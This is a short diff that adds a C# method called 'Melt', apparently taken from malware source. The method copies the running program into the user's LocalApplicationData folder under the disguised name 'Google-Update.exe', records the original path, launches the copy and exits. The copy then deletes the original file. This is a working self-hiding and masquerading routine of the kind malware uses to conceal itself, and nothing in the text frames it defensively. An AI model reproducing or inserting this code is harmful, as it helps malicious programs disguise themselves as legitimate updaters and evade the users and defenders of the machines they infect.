@@ -1,0 +1,26 @@
+static void Melt()
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            if (!Application.ExecutablePath.Contains(path))
+            {
+                if (File.Exists(path + "\\Google-Update.exe")) { File.Delete(path + "\\Google-Update.exe"); }
+                if (File.Exists(path + "\\location.txt")) { File.Delete(path + "\\location.txt"); }
+                File.Copy(Application.ExecutablePath, path + "\\Google-Update.exe");
+                StreamWriter sw = new StreamWriter(path + "\\location.txt");
+                sw.WriteLine(Application.ExecutablePath);
+                sw.Close();
+                Process.Start(path + "\\Google-Update.exe");
+                Environment.Exit(0);
+            }
+            else
+            {
+                if (File.Exists(path + "\\location.txt"))
+                {
+                    StreamReader sr = new StreamReader(path + "\\location.txt");
+                    string location = sr.ReadToEnd();
+                    sr.Close();
+                    File.Delete(location);
+                    File.Delete(path + "\\location.txt");
+                }
+            }
+        }
